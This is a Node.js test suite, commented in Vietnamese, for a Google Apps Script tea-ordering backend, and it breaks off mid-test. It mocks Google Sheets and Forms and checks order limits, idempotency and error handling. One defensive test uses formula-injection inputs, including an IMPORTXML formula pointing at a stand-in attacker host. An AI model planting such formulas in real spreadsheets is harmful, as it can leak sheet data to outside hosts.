'use strict';
/**
 * Chạy Code.gs thật với Sheets, Lock, Properties giả.
 * Sheets giả bắt chước phần dễ gây lỗi của Sheets thật: chuỗi bắt đầu bằng = thành công thức,
 * chuỗi số thành số, dấu ' đầu được bỏ khi lưu, ghi ngoài lưới thì báo lỗi.
 */
const test = require('node:test');
const assert = require('node:assert/strict');
const crypto = require('node:crypto');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');

const root = path.join(__dirname, '..');
const read = (p) => fs.readFileSync(path.join(root, p), 'utf8');

const N8N_KEY = 'khoa-n8n-thu';
const STAFF_KEY = 'khoa-nhan-vien-thu';

const plain = (value) => JSON.parse(JSON.stringify(value));

class FakeSheet {
  constructor(name, env) {
    this.name = name;
    this.env = env;
    this.cells = [];
    this.maxRows = 1000;
    this.maxColumns = 26;
    this.formulas = [];
    this.numberFormats = {};
  }
  getName() { return this.name; }
  getLastRow() {
    for (let r = this.cells.length - 1; r >= 0; r--) {
      if ((this.cells[r] || []).some((c) => c !== '' && c !== undefined)) return r + 1;
    }
    return 0;
  }
  getLastColumn() {
    return this.cells.reduce((max, row) => {
      let last = 0;
      (row || []).forEach((c, i) => { if (c !== '' && c !== undefined) last = i + 1; });
      return Math.max(max, last);
    }, 0);
  }
  getMaxRows() { return this.maxRows; }
  getMaxColumns() { return this.maxColumns; }
  insertRowsAfter(_after, count) { this.maxRows += count; }
  insertColumnsAfter(_after, count) { this.maxColumns += count; }
  setFrozenRows() {}
  setFrozenColumns() {}
  setName(name) {
    this.env.renamedTabs = (this.env.renamedTabs || 0) + 1;
    this.env.sheets.delete(this.name);
    this.name = name;
    this.env.sheets.set(name, this);
  }
  /** Như Sheets: destination tính theo vị trí trước khi chuyển; định dạng, độ rộng, ẩn cột đi theo cột. */
  moveColumns(range, destination) {
    assert.equal(range.numColumns, 1);
    this.env.movedColumns = (this.env.movedColumns || 0) + 1;
    const from = range.column;
    const target = destination > from ? destination - 1 : destination;
    const width = Math.max(...this.cells.map((row) => row.length), target);
    this.cells.forEach((row) => {
      while (row.length < width) row.push('');
      row.splice(target - 1, 0, row.splice(from - 1, 1)[0]);
    });
    const map = (c) => {
      if (c === from) return target;
      if (from < c && c <= target) return c - 1;
      if (target <= c && c < from) return c + 1;
      return c;
    };
    const remapKeys = (object, key) => Object.fromEntries(Object.entries(object || {}).map(([k, v]) => [key(k), v]));
    this.numberFormats = remapKeys(this.numberFormats, (k) => { const [r, c] = k.split(',').map(Number); return `${r},${map(c)}`; });
    this.columnWidths = remapKeys(this.columnWidths, (k) => map(Number(k)));
    this.notes = remapKeys(this.notes, (k) => map(Number(k)));
    if (this.hiddenColumns) this.hiddenColumns = new Set([...this.hiddenColumns].map(map));
    if (this.wrappedColumns) this.wrappedColumns = new Set([...this.wrappedColumns].map(map));
    (this.protections || []).forEach((p) => { p.column = map(p.column); });
  }
  setRowHeight() {}
  setColumnWidth(column, width) { (this.columnWidths = this.columnWidths || {})[column] = width; }
  getBandings() { return this.bandings || []; }
  hideColumns(column) { (this.hiddenColumns = this.hiddenColumns || new Set()).add(column); }
  getProtections() { return this.protections || []; }
  getConditionalFormatRules() { return this.colorRules || []; }
  setConditionalFormatRules(rules) { this.colorRules = rules; }
  getFilter() { return this.filter || null; }
  getDataRange() {
    return this.getRange(1, 1, Math.max(1, this.getLastRow()), Math.max(1, this.getLastColumn()));
  }
  getRange(row, column, numRows = 1, numColumns = 1) {
    if (row < 1 || column < 1 || row + numRows - 1 > this.maxRows || column + numColumns - 1 > this.maxColumns) {
      throw new Error(`Ngoài lưới: ${this.name} ${row},${column},${numRows},${numColumns}`);
    }
    return new FakeRange(this, row, column, numRows, numColumns);
  }
  store(row, column, value) {
    while (this.cells.length < row) this.cells.push([]);
    const cells = this.cells[row - 1];
    while (cells.length < column) cells.push('');
    cells[column - 1] = convertLikeSheets(value, this, row, column);
  }
  value(row, column) {
    const cell = (this.cells[row - 1] || [])[column - 1];
    return cell === undefined ? '' : cell;
  }
}

function convertLikeSheets(value, sheet, row, column) {
  if (typeof value !== 'string') return value;
  if (value.startsWith("'")) return value.slice(1);
  if (value.startsWith('=')) {
    sheet.formulas.push({ row, column, value });
    return `#FORMULA:${value}`;
  }
  if (/^-?\d+(\.\d+)?$/.test(value)) return Number(value);
  if (/^(true|false)$/i.test(value)) return value.toLowerCase() === 'true';
  if (/^\d{1,2}\/\d{1,2}$/.test(value)) return new Date(2026, Number(value.split('/')[1]) - 1, Number(value.split('/')[0]));
  return value;
}

class FakeRange {
  constructor(sheet, row, column, numRows, numColumns) {
    Object.assign(this, { sheet, row, column, numRows, numColumns });
  }
  getValues() {
    this.sheet.env.failIfBroken();
    const rows = [];
    for (let r = 0; r < this.numRows; r++) {
      const cols = [];
      for (let c = 0; c < this.numColumns; c++) cols.push(this.sheet.value(this.row + r, this.column + c));
      rows.push(cols);
    }
    return rows;
  }
  setValues(rows) {
    this.sheet.env.assertLockedForOrders(this.sheet);
    assert.equal(rows.length, this.numRows, 'số dòng ghi phải khớp vùng');
    rows.forEach((cols, r) => {
      assert.equal(cols.length, this.numColumns, 'số cột ghi phải khớp vùng');
      cols.forEach((value, c) => this.sheet.store(this.row + r, this.column + c, value));
    });
    return this;
  }
  setValue(value) {
    this.sheet.env.assertLockedForOrders(this.sheet);
    this.sheet.store(this.row, this.column, value);
    return this;
  }
  setDataValidation(rule) {
    if (this.numRows === 1 && this.numColumns === 1) {
      (this.sheet.validations = this.sheet.validations || {})[`${this.row},${this.column}`] = rule;
    }
    return this;
  }
  setBackground() { return this; }
  setFontColor() { return this; }
  setFontWeight() { return this; }
  setFontSize(size) {
    if (this.row > 1) this.sheet.dataFontSize = size;
    return this;
  }
  setVerticalAlignment() { return this; }
  setHorizontalAlignment(value) {
    if (this.row === 1) this.sheet.headerAlignment = value;
    return this;
  }
  setWrap() {
    (this.sheet.wrappedColumns = this.sheet.wrappedColumns || new Set()).add(this.column);
    return this;
  }
  setNote(text) {
    this.sheet.notes = this.sheet.notes || {};
    if (text) this.sheet.notes[this.column] = text;
    else delete this.sheet.notes[this.column];
    return this;
  }
  applyRowBanding() {
    assert.equal((this.sheet.bandings || []).length, 0, 'Sheets báo lỗi khi vùng đã có màu xen kẽ');
    this.sheet.bandings = [{}];
    return this.sheet.bandings[0];
  }
  protect() {
    const protection = {
      warningOnly: false,
      column: this.column,
      setDescription(text) { protection.description = text; return protection; },
      getDescription() { return protection.description; },
      setWarningOnly(value) { protection.warningOnly = value; return protection; },
    };
    (this.sheet.protections = this.sheet.protections || []).push(protection);
    return protection;
  }
  createFilter() {
    assert.equal(this.sheet.filter, undefined, 'Sheets báo lỗi khi tạo bộ lọc thứ hai');
    this.sheet.filter = { row: this.row, numColumns: this.numColumns };
    return this.sheet.filter;
  }
  setNumberFormat(format) {
    this.sheet.numberFormats[`${this.row},${this.column}`] = format;
    return this;
  }
}

/** Google Form giả: đủ để setupBackupForm chạy và để test gửi đúng câu hỏi đã tạo. */
class FakeFormItem {
  constructor(type) { this.type = type; this.choices = []; this.required = false; }
  setTitle(title) { this.title = title; return this; }
  getTitle() { return this.title; }
  setRequired(value) { this.required = value; return this; }
  setHelpText() { return this; }
  setValidation(validation) { this.validation = validation; return this; }
  setChoiceValues(values) {
    assert.ok(values.length > 0, 'Form không nhận danh sách lựa chọn rỗng');
    this.choices = values;
    return this;
  }
  asListItem() { assert.equal(this.type, 'list'); return this; }
  asCheckboxItem() { assert.equal(this.type, 'checkbox'); return this; }
}

class FakeForm {
  constructor(id) { this.id = id; this.items = []; }
  getId() { return this.id; }
  getPublishedUrl() { return `https://docs.google.com/forms/d/e/${this.id}/viewform`; }
  getItems() { return this.items.slice(); }
  deleteItem(item) { this.items = this.items.filter((i) => i !== item); }
  setTitle(title) { this.title = title; return this; }
  setDescription(text) { this.description = text; return this; }
  setAllowResponseEdits() { return this; }
  setShowLinkToRespondAgain() { return this; }
  setConfirmationMessage() { return this; }
  add(type) { const item = new FakeFormItem(type); this.items.push(item); return item; }
  addTextItem() { return this.add('text'); }
  addParagraphTextItem() { return this.add('paragraph'); }
  addListItem() { return this.add('list'); }
  addCheckboxItem() { return this.add('checkbox'); }
  addMultipleChoiceItem() { return this.add('multiple'); }
}

function makeEnv() {
  const env = {
    sheets: new Map(),
    props: new Map(),
    forms: new Map(),
    triggers: [],
    responseCounter: 0,
    lockHeld: false,
    lockAvailable: true,
    setupRunning: false,
    sheetsBroken: false,
    failIfBroken() { if (env.sheetsBroken) throw new Error('Sheets lỗi'); },
    assertLockedForOrders(sheet) {
      if (['Đơn hàng', 'Orders'].includes(sheet.name) && !env.lockHeld && !env.setupRunning) throw new Error('Ghi Đơn hàng khi chưa có lock');
    },
  };

  const spreadsheet = {
    getSheetByName: (name) => env.sheets.get(name) || null,
    insertSheet: (name) => {
      const sheet = new FakeSheet(name, env);
      env.sheets.set(name, sheet);
      return sheet;
    },
    setSpreadsheetTimeZone: (tz) => { env.timeZone = tz; },
  };
  const validationBuilder = {
    requireValueInList(values) {
      Object.assign(validationBuilder, { isList: true, allowInvalid: true, values, formula: undefined });
      return validationBuilder;
    },
    requireCheckbox() { Object.assign(validationBuilder, { isList: false, values: undefined, formula: undefined }); return validationBuilder; },
    requireFormulaSatisfied(formula) {
      // Sheet vùng Việt Nam từ chối dấu phẩy ngăn đối số, và lỗi chỉ hiện ở lệnh sau nên không bắt được.
      assert.ok(!/[,;]/.test(formula), `công thức kiểm tra không được có dấu ngăn đối số: ${formula}`);
      Object.assign(validationBuilder, { isList: false, allowInvalid: true, values: undefined, formula });
      return validationBuilder;
    },
    setAllowInvalid(value) { validationBuilder.allowInvalid = value; return validationBuilder; },
    setHelpText() { return validationBuilder; },
    build() {
      if (validationBuilder.isList) (env.dropdowns = env.dropdowns || []).push(validationBuilder.allowInvalid);
      return { values: validationBuilder.values, formula: validationBuilder.formula, allowInvalid: validationBuilder.allowInvalid };
    },
  };
  const output = (content) => {
    const result = {
      content,
      metaTags: {},
      setMimeType() { return result; },
      setTitle(title) { result.title = title; return result; },
      addMetaTag(name, value) { result.metaTags[name] = value; return result; },
      getContent() { return result.content; },
    };
    return result;
  };

  const sandbox = {
    console: { error: (...args) => { env.lastError = args; }, log() {} },
    SpreadsheetApp: {
      getActiveSpreadsheet: () => spreadsheet,
      flush() { env.flushed = (env.flushed || 0) + 1; },
      newDataValidation: () => validationBuilder,
      ProtectionType: { RANGE: 'RANGE' },
      BandingTheme: { LIGHT_GREY: 'LIGHT_GREY' },
      newConditionalFormatRule: () => {
        const rule = {
          whenFormulaSatisfied(formula) { rule.formula = formula; return rule; },
          whenTextEqualTo(text) { rule.text = text; return rule; },
          setBackground(color) { rule.color = color; return rule; },
          setRanges(ranges) { rule.ranges = ranges; return rule; },
          build() { return rule; },
        };
        return rule;
      },
    },
    LockService: {
      getScriptLock: () => ({
        tryLock() {
          if (!env.lockAvailable) return false;
          assert.equal(env.lockHeld, false, 'không được giữ hai lock');
          env.lockHeld = true;
          return true;
        },
        releaseLock() { env.lockHeld = false; },
      }),
    },
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: (key) => (env.props.has(key) ? env.props.get(key) : null),
        setProperty: (key, value) => { env.props.set(key, value); },
        deleteProperty: (key) => { env.props.delete(key); },
      }),
    },
    ContentService: {
      MimeType: { JSON: 'application/json' },
      createTextOutput: output,
    },
    HtmlService: {
      createHtmlOutput: output,
      createTemplateFromFile(name) {
        const template = {
          evaluate() {
            // Thay scriptlet như HtmlService, đủ để trang chạy trong test.
            const html = read(`apps-script/${name}.html`)
              .replace(/<\?!=\s*(\w+)\s*\?>/g, (_m, key) => template[key]);
            return output(html);
          },
        };
        return template;
      },
    },
    Utilities: {
      formatDate(date, timeZone, format) {
        assert.equal(timeZone, 'Asia/Ho_Chi_Minh');
        assert.equal(format, 'yyyy-MM-dd HH:mm:ss');
        return new Date(date.getTime() + 7 * 3600 * 1000).toISOString().slice(0, 19).replace('T', ' ');
      },
      DigestAlgorithm: { SHA_256: 'sha256' },
      Charset: { UTF_8: 'utf8' },
      computeDigest: (algorithm, text, charset) => [...crypto.createHash(algorithm).update(text, charset).digest()],
      base64Encode: (bytes) => Buffer.from(bytes).toString('base64'),
    },
    FormApp: {
      create(_title, isPublished) {
        const form = new FakeForm(`form-${env.forms.size + 1}`);
        form.published = isPublished === true;
        env.forms.set(form.id, form);
        return form;
      },
      openById(id) {
        if (!env.forms.has(id)) throw new Error('Không có Form');
        return env.forms.get(id);
      },
      createTextValidation: () => ({ requireWholeNumber() { return this; }, build: () => ({}) }),
    },
    ScriptApp: {
      getProjectTriggers: () => env.triggers.slice(),
      deleteTrigger(trigger) { env.triggers = env.triggers.filter((t) => t !== trigger); },
      newTrigger: (handler) => ({
        forForm: (form) => ({
          onFormSubmit: () => ({
            create() {
              env.triggers.push({ getHandlerFunction: () => handler, getTriggerSourceId: () => form.getId() });
            },
          }),
        }),
      }),
    },
  };

  vm.createContext(sandbox);
  vm.runInContext(read('apps-script/Logic.gs'), sandbox);
  vm.runInContext(read('apps-script/Code.gs'), sandbox);
  env.gs = sandbox;
  env.setup = () => {
    env.setupRunning = true;
    try { sandbox.setup(); } finally { env.setupRunning = false; }
  };
  env.post = (body, parameter = {}) => {
    const contents = typeof body === 'string' ? body : JSON.stringify(body);
    return JSON.parse(sandbox.doPost({ parameter, postData: { contents } }).content);
  };
  env.get = (parameter = {}) => sandbox.doGet({ parameter });
  env.getJson = (parameter = {}) => JSON.parse(env.get(parameter).content);
  env.staff = (payload, key = STAFF_KEY) => plain(sandbox.staffSubmit(payload, key));
  env.pending = () => env.getJson({ action: 'pending', key: N8N_KEY });
  env.ack = (body, key = N8N_KEY) => env.post(body, { action: 'ack', key });
  /** Gửi Form dự phòng như trigger thật. Câu hỏi phải có trong Form đã tạo, lựa chọn phải nằm trong danh sách. */
  env.submitForm = (answers, responseId = `phan-hoi-${++env.responseCounter}`) => {
    const form = env.forms.get(env.props.get('BACKUP_FORM_ID'));
    const itemResponses = Object.entries(answers)
      .filter(([, value]) => value !== undefined)
      .map(([title, value]) => {
        const item = form.items.find((i) => i.title === title);
        assert.ok(item, `Form không có câu hỏi ${title}`);
        [].concat(value).forEach((choice) => {
          if (item.choices.length) assert.ok(item.choices.includes(choice), `Form không có lựa chọn ${choice}`);
        });
        return { getItem: () => item, getResponse: () => value };
      });
    sandbox.onBackupFormSubmit({ response: { getId: () => responseId, getItemResponses: () => itemResponses } });
  };

  /** Tab theo tên mới, hoặc tên cũ nếu Sheet chưa chạy lại setup. */
  env.tab = (name) => env.sheets.get(name) || env.sheets.get(sandbox.SHEET_OLD_NAMES[name]);
  const table = (name) => {
    const sheet = env.tab(name);
    const values = sheet.getDataRange().getValues();
    return { sheet, headers: sandbox.headerKeys_(name, values[0]), rows: values.slice(1) };
  };
  /** Khoá nội bộ của từng cột, để test tra cột không phụ thuộc nhãn hiển thị. */
  env.columnOf = (name, key) => {
    const sheet = env.tab(name);
    return sandbox.headerKeys_(name, sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0]).indexOf(key) + 1;
  };
  env.configRows = () => {
    const { headers, rows } = table('Cấu hình');
    return rows.map((row) => Object.fromEntries(headers.map((h, i) => [h, row[i]])));
  };
  /** Đưa tên tab về tên cũ, như Sheet đã chạy setup trước khi có tên tiếng Việt. */
  env.useOldTabNames = () => {
    for (const sheet of [...env.sheets.values()]) sheet.setName(sandbox.SHEET_OLD_NAMES[sheet.name]);
    env.renamedTabs = 0;
  };
  /** Đưa dòng tiêu đề về tiếng Anh, như Sheet đã chạy setup trước khi có nhãn tiếng Việt. */
  env.useEnglishHeaders = () => {
    for (const [name, sheet] of env.sheets) {
      const cells = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0];
      sandbox.headerKeys_(name, cells).forEach((key, i) => sheet.store(1, i + 1, key));
    }
  };
  env.orderRows = () => {
    const { headers, rows } = table('Đơn hàng');
    return rows.map((row) => Object.fromEntries(headers.map((h, i) => [h, row[i]])));
  };
  env.setCell = (sheetName, match, column, value) => {
    const { sheet, headers, rows } = table(sheetName);
    const r = rows.findIndex(match(headers));
    assert.ok(r >= 0, 'không tìm thấy dòng cần sửa');
    sheet.store(r + 2, headers.indexOf(column) + 1, value);
  };
  env.setConfig = (key, value) => {
    env.setCell('Cấu hình', (h) => (row) => row[h.indexOf('key')] === key, 'value', value);
  };
  env.setOrderStatus = (code, status) => {
    env.setCell('Đơn hàng', (h) => (row) => row[h.indexOf('order_code')] === code, 'status', status);
  };
  return env;
}

function readyEnv() {
  const env = makeEnv();
  env.setup();
  env.props.set('N8N_KEY', N8N_KEY);
  env.props.set('STAFF_KEY', STAFF_KEY);
  return env;
}

let submissionCounter = 0;
function order(overrides) {
  submissionCounter += 1;
  return {
    submission_id: `sub-${submissionCounter}`,
    source: 'landing',
    name: 'Nguyễn Văn A',
    phone: `09${String(10000000 + submissionCounter)}`,
    contact: '',
    items: [{ product_id: 'tra-sua-truyen-thong', quantity: 2, toppings: [] }],
    delivery_method: 'giao',
    zone: 'den_10km',
    address: '12 Đường Ví Dụ, Phường Mẫu',
    payment_method: 'cod',
    note: '',
    website: '',
    ...overrides,
  };
}
const cups = (quantity) => ({ items: [{ product_id: 'tra-sua-truyen-thong', quantity, toppings: [] }] });

/* ---------- setup ---------- */

test('setup chạy hai lần: đủ tab và tiêu đề, không xoá dữ liệu', () => {
  const env = makeEnv();
  env.setup();
  for (const name of ['Đơn hàng', 'Cấu hình', 'Món', 'Topping']) assert.ok(env.sheets.get(name), name);
  env.props.set('STAFF_KEY', STAFF_KEY);

  const created = env.post(order());
  assert.equal(created.ok, true);
  env.setConfig('max_cups', 123);
  env.setCell('Món', (h) => (row) => row[h.indexOf('product_id')] === 'tra-sua-matcha', 'price', 77000);
  const orderSheet = env.sheets.get('Đơn hàng');
  const headersBefore = orderSheet.getRange(1, 1, 1, orderSheet.getLastColumn()).getValues();

  env.setup();

  assert.deepEqual(orderSheet.getRange(1, 1, 1, orderSheet.getLastColumn()).getValues(), headersBefore);
  assert.equal(env.orderRows().length, 1);
  assert.equal(env.orderRows()[0].order_code, created.order_code);
  const config = env.getJson();
  assert.equal(config.products.find((p) => p.product_id === 'tra-sua-matcha').price, 77000);
  const configRows = env.configRows();
  assert.equal(configRows.find((r) => r.key === 'max_cups').value, 123);
  assert.equal(new Set(configRows.map((r) => r.key)).size, configRows.length, 'không có khoá trùng');
  assert.equal(env.timeZone, 'Asia/Ho_Chi_Minh');
});

test('setup làm gọn tab Đơn hàng: ẩn cột hệ thống, cảnh báo, tô màu, lọc; chạy lại không nhân đôi', () => {
  const env = makeEnv();
  env.setup();
  env.setup();
  const sheet = env.sheets.get('Đơn hàng');
  const column = (name) => env.columnOf('Đơn hàng', name);

  assert.deepEqual(
    [...sheet.hiddenColumns].sort((a, b) => a - b),
    ['notified_at', 'submission_id', 'items', 'transfer_qr_url'].map(column).sort((a, b) => a - b)
  );
  assert.equal(sheet.protections.length, 6, 'mỗi cột một cảnh báo, không nhân đôi');
  assert.ok(sheet.protections.every((p) => p.warningOnly === true));
  assert.equal(sheet.colorRules.length, 4);
  assert.ok(sheet.filter);
  assert.equal(sheet.bandings.length, 1, 'chạy lại không tạo thêm màu xen kẽ');
  assert.equal(sheet.columnWidths[column('items_text')], 240);

  const formulas = sheet.colorRules.map((r) => r.formula).join(' ');
  assert.ok(formulas.includes(`$${String.fromCharCode(64 + column('status'))}2="huy"`));
  assert.ok(formulas.includes(`$${String.fromCharCode(64 + column('needs_call'))}2=TRUE`));
});

test('setup giữ luật tô màu nhóm đã tự thêm', () => {
  const env = makeEnv();
  env.setup();
  const sheet = env.sheets.get('Đơn hàng');
  const teamRule = { formula: '=TRUE' };
  sheet.colorRules = [teamRule];
  env.setup();
  assert.deepEqual(sheet.colorRules, [teamRule]);
});

test('setup thêm cột còn thiếu ở cuối, cột lạ của nhóm được giữ, đơn mới vẫn đúng cột', () => {
  const env = readyEnv();
  const sheet = env.sheets.get('Đơn hàng');
  const added = sheet.getLastColumn() + 1;
  sheet.store(1, added, 'cot_cua_nhom');
  sheet.store(2, added, 'giữ nguyên');
  env.setup();
  assert.equal(sheet.value(1, added), 'cot_cua_nhom');
  assert.equal(sheet.value(2, added), 'giữ nguyên');
  assert.equal(env.post(order()).ok, true);
});

test('form hoạt động khi đổi thứ tự cột trong Đơn hàng', () => {
  const env = readyEnv();
  const sheet = env.sheets.get('Đơn hàng');
  const headers = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0];
  headers.reverse().forEach((h, i) => sheet.store(1, i + 1, h));
  const created = env.post(order());
  assert.equal(created.total, 108000);
  assert.equal(env.orderRows()[0].total, 108000);
  assert.equal(env.orderRows()[0].order_code, created.order_code);
});

test('chưa chạy setup thì trả SERVER_ERROR, không lộ chi tiết', () => {
  const env = makeEnv();
  const result = env.post(order());
  assert.equal(result.error_code, 'SERVER_ERROR');
  assert.ok(!result.message.includes('setup'));
});

/* ---------- Cấu hình công khai ---------- */

test('GET mặc định trả menu, giá, phí ship, trạng thái; không lộ số suất', () => {
  const env = readyEnv();
  const config = env.getJson();
  assert.equal(config.ok, true);
  assert.equal(config.orders_open, true);
  assert.equal(config.products[0].price, 49000);
  assert.deepEqual(Object.keys(config.products[0]).sort(), ['name', 'price', 'product_id']);
  assert.equal(config.shipping_fees.den_10km, 10000);
  assert.equal(config.toppings.length, 2);
  assert.equal(config.max_cups, undefined);
});

/* ---------- Tạo đơn: các hàng trong ma trận I/O ---------- */

test('đặt hợp lệ: ghi một dòng, trả order_code, total, shipping_fee đúng hợp đồng', () => {
  const env = readyEnv();
  const response = env.post(order());
  assert.deepEqual(response, {
    ok: true,
    order_code: 'TS-0001',
    total: 108000,
    shipping_fee: 10000,
    message: 'Đã nhận đơn',
  });
  const rows = env.orderRows();
  assert.equal(rows.length, 1);
  assert.equal(rows[0].status, 'moi');
  assert.equal(rows[0].payment_status, 'cod');
  assert.equal(rows[0].cups, 2);
  assert.equal(rows[0].source, 'landing');
  assert.equal(rows[0].notified_at, '');
  assert.equal(rows[0].call_done, false);
  assert.equal(env.lockHeld, false, 'phải nhả lock');
  assert.ok(env.flushed > 0, 'phải flush trong lock');
  assert.equal(env.post(order()).order_code, 'TS-0002');
});

test('gửi lại cùng submission_id: trả đúng đơn cũ, không tạo dòng mới', () => {
  const env = readyEnv();
  const payload = order();
  const first = env.post(payload);
  const second = env.post(payload);
  assert.deepEqual(second, first);
  assert.equal(env.orderRows().length, 1);
});

test('gửi lại vẫn nhận đơn cũ dù đã đóng đơn, hết suất hoặc submission_id giống số', () => {
  const env = readyEnv();
  const payload = order({ submission_id: '12345' });
  const first = env.post(payload);
  env.setConfig('orders_open', false);
  assert.deepEqual(env.post(payload), first);
  env.setConfig('orders_open', true);
  env.setConfig('max_cups', 1);
  assert.deepEqual(env.post(payload), first);
  assert.equal(env.orderRows().length, 1);
});

test('vượt suất: SOLD_OUT, không ghi; vừa khít thì nhận', () => {
  const env = readyEnv();
  env.setConfig('max_cups', 10);
  env.setConfig('max_cups_per_phone_public', 100);
  assert.equal(env.post(order(cups(8))).ok, true);
  const over = env.post(order(cups(3)));
  assert.equal(over.ok, false);
  assert.equal(over.error_code, 'SOLD_OUT');
  assert.equal(env.orderRows().length, 1);
  assert.equal(env.post(order(cups(2))).ok, true);
  assert.equal(env.post(order(cups(1))).error_code, 'SOLD_OUT');
  assert.equal(env.orderRows().length, 2);
});

test('form nội bộ cũng bị chặn khi hết suất', () => {
  const env = readyEnv();
  env.setConfig('max_cups', 2);
  const result = env.staff(order({ source: undefined, ...cups(3) }));
  assert.equal(result.error_code, 'SOLD_OUT');
  assert.equal(env.orderRows().length, 0);
});

test('orders_open tắt: SOLD_OUT, không ghi, ở cả hai kênh', () => {
  const env = readyEnv();
  env.setConfig('orders_open', false);
  assert.equal(env.post(order()).error_code, 'SOLD_OUT');
  assert.equal(env.staff(order()).error_code, 'SOLD_OUT');
  assert.equal(env.orderRows().length, 0);
  assert.equal(env.getJson().orders_open, false);
});

test('quá giới hạn SĐT: LIMIT_EXCEEDED ở landing, form nội bộ không áp dụng', () => {
  const env = readyEnv();
  env.setConfig('max_cups_per_phone_public', 5);
  const phone = '0912345678';
  assert.equal(env.post(order({ phone, ...cups(4) })).ok, true);
  const over = env.post(order({ phone: '+84 912 345 678', ...cups(2) }));
  assert.equal(over.error_code, 'LIMIT_EXCEEDED');
  assert.equal(env.orderRows().length, 1);
  assert.equal(env.post(order({ phone, ...cups(1) })).ok, true);
  assert.equal(env.staff(order({ phone, ...cups(20) })).ok, true);
  assert.equal(env.post(order({ phone: '0987654321', ...cups(1) })).ok, true);
});

test('huỷ đơn trả lại giới hạn theo SĐT', () => {
  const env = readyEnv();
  env.setConfig('max_cups_per_phone_public', 5);
  const phone = '0912345678';
  const first = env.post(order({ phone, ...cups(5) }));
  assert.equal(env.post(order({ phone, ...cups(1) })).error_code, 'LIMIT_EXCEEDED');
  env.setOrderStatus(first.order_code, 'huy');
  assert.equal(env.post(order({ phone, ...cups(1) })).ok, true);
});

test('sai dữ liệu: INVALID_INPUT có message tiếng Việt, không ghi', () => {
  const env = readyEnv();
  const cases = [
    order({ phone: '123' }),
    order({ address: '' }),
    order(cups(0)),
    order({ items: [{ product_id: 'khong-co', quantity: 1, toppings: [] }] }),
    order({ payment_method: 'chuyen_khoan' }),
    order({ source: 'messenger' }),
    order({ submission_id: '' }),
    '{json hỏng',
    '[]',
    'null',
    'x'.repeat(30000),
  ];
  for (const payload of cases) {
    const result = env.post(payload);
    assert.equal(result.ok, false);
    assert.equal(result.error_code, 'INVALID_INPUT');
    assert.ok(result.message.length > 0);
  }
  assert.equal(env.orderRows().length, 0);
  assert.equal(env.lockHeld, false);
});

test('POST không có thân: INVALID_INPUT', () => {
  const env = readyEnv();
  const result = JSON.parse(env.gs.doPost({ parameter: {} }).content);
  assert.equal(result.error_code, 'INVALID_INPUT');
});

test('giá gửi từ trang bị bỏ qua', () => {
  const env = readyEnv();
  const result = env.post(order({ total: 1, price: 1, shipping_fee: 0 }));
  assert.equal(result.total, 108000);
  assert.equal(env.orderRows()[0].total, 108000);
});

test('bot điền ô website: INVALID_INPUT, không ghi', () => {
  const env = readyEnv();
  const result = env.post(order({ website: 'http://spam.example' }));
  assert.equal(result.error_code, 'INVALID_INPUT');
  assert.equal(env.orderRows().length, 0);
});

test('tiêm công thức: lưu như chữ thường, không tạo công thức', () => {
  const env = readyEnv();
  const attack = '=IMPORTXML("http://evil.example","//a")';
  const created = env.post(order({ name: attack, address: '+SUM(1,1)', note: '@cmd', contact: '-1+1' }));
  assert.equal(created.ok, true);
  const row = env.orderRows()[0];
  assert.equal(env.sheets.get('Đơn hàng').formulas.length, 0);
  assert.equal(row.name, attack);
  assert.equal(row.address, '+SUM(1,1)');
  assert.equal(row.note, '@cmd');
  assert.equal(row.contact, '-1+1');
  assert.equal(env.pending().orders[0].name, attack);
});

test('SĐT giữ số 0 đầu và ghi chú dạng ngày vẫn là chữ', () => {
  const env = readyEnv();
  env.post(order({ phone: '0912345678', note: '5/11', address: '12345' }));
  const row = env.orderRows()[0];
  assert.equal(row.phone, '0912345678');
  assert.equal(row.note, '5/11');
  assert.equal(row.address, '12345');
  assert.equal(env.pending().orders[0].phone, '0912345678');
});

test('lock timeout: SERVER_ERROR, không ghi', () => {
  const env = readyEnv();
  env.lockAvailable = false;
  assert.equal(env.post(order()).error_code, 'SERVER_ERROR');
  assert.equal(env.ack({ codes: [] }).error_code, 'SERVER_ERROR');
  assert.equal(env.lockHeld, false);
});

test('lỗi Sheets: SERVER_ERROR, nhả lock, không lộ chi tiết', () => {
  const env = readyEnv();
  env.sheetsBroken = true;
  const result = env.post(order());
  assert.equal(result.error_code, 'SERVER_ERROR');
  assert.ok(!result.message.includes('Sheets lỗi'));
  assert.equal(env.lockHeld, false);
  assert.equal(env.getJson().error_code, 'SERVER_ERROR');
  assert.equal(env.pending().error_code, 'SERVER_ERROR');
  assert.equal(env.staff(order()).error_code, 'SERVER_ERROR');
});

test('Cấu hình hỏng: không nhận đơn, báo SERVER_ERROR', () => {
  const env = readyEnv();
  env.setConfig('max_cups', 'rất nhiều');
  assert.equal(env.post(order()).error_code, 'SERVER_ERROR');
  assert.equal(env.orderRows().length, 0);
});

test('mở rộng lưới khi hết dòng', () => {
  const env = readyEnv();
  const sheet = env.sheets.get('Đơn hàng');
  sheet.maxRows = 2;
  assert.equal(env.post(order()).ok, true);
  assert.equal(env.post(order()).ok, true);
  assert.equal(env.orderRows().length, 2);
});

test('xoá dòng cuối không làm cấp lại mã đơn', () => {
  const env = readyEnv();
  assert.equal(env.post(order()).order_code, 'TS-0001');
  env.sheets.get('Đơn hàng').cells.length = 1;
  assert.equal(env.post(order()).order_code, 'TS-0002');
});

/* ---------- Tiêu chí chấp nhận về suất và giá ---------- */

test('đổi đơn thành huy: suất được trả lại; bom thì không', () => {
  const env = readyEnv();
  env.setConfig('max_cups', 5);
  env.setConfig('max_cups_per_phone_public', 100);
  const first = env.post(order(cups(3)));
  const second = env.post(order(cups(2)));
  assert.equal(env.post(order(cups(1))).error_code, 'SOLD_OUT');

  env.setOrderStatus(second.order_code, 'bom');
  assert.equal(env.post(order(cups(1))).error_code, 'SOLD_OUT');

  env.setOrderStatus(first.order_code, 'huy');
  assert.equal(env.post(order(cups(3))).ok, true);
  assert.equal(env.post(order(cups(1))).error_code, 'SOLD_OUT');
});

test('nhóm sửa giá và phí ship trong Sheets: đơn mới theo giá mới', () => {
  const env = readyEnv();
  assert.equal(env.post(order()).total, 108000);
  env.setCell('Món', (h) => (row) => row[h.indexOf('product_id')] === 'tra-sua-truyen-thong', 'price', 55000);
